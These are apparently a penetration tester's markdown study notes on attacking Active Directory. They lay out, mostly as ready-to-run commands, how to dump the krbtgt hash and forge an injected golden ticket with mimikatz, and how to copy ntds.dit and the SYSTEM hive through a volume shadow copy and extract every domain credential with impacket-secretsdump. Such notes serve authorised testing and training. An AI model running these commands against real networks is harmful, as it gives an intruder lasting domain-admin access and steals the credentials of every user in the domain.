# Golden Ticket
When user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. The secret key is actually the password hash of a domain user account called krbtgt.
For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group, and domain controller will trust it because it is correctly encrypted.
>We must carefully protect stolen _krbtgt_ password hashes because they grant unlimited domain access. Consider explicitly obtaining the client's permission before executing this technique.

Obtain the NTLM hash of the krbtgt account:
```
lsadump::lsa /patch
```
Delete any kerberos tickets:
```
kerberos::purge
```
Creating golden ticket and injecting it into the memory:
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
# Shadow Copies
>A _Shadow Copy_, is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.

To manage volume shadow copies - microsoft offered a binary vshadow.exe.
As DA we can create a shadow copy that will allow us to extract the AD database file.
```
vshadow.exe -nw -p  C:
```
Take a note about shadow copy device name.
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
To correctly extract the content of ntds.dit we need to save the SYSTEM hive from the Windows registry:
```
reg.exe save hklm\system c:\system.bak
```
Move two .bak files to your machine and use impacket tools to extract credentials from ntds.dit:
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
